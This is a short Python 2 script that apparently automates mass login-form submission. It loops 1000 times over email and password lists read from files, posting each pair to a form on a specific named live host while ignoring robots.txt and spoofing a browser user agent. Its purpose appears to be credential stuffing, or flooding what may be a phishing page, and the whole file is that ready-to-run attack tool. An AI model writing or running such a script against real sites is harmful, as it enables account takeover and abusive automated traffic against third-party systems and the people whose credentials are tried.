import re
from mechanize import Browser
from termcolor import colored,cprint

emailFile = open('emails.txt', "r")
email = emailFile.readlines()
passFile = open('pass.txt', "r")
password = passFile.readlines()
size = 1000

for i in range(size):
    br = Browser()
    br.set_handle_robots(False)
    br.open("http://pushnotify-wrygamnuidl.yapitek.com.tr/shownews.php")
    br.addheaders = [("User-agent","Mozilla/5.0")]
    br.select_form(nr=0)
    br.form['email'] = email[i]
    br.form['pass'] = password[i]
    print colored("ITERATION: " , 'blue')+str(i)+"/"+str(size)
    print colored("email = " , 'green') + email[i]
    print colored("pass = " , 'red') + password[i]
    print "------------------------------------"
    br.submit()

print colored("PROCCESS COMPLETED" , 'green')
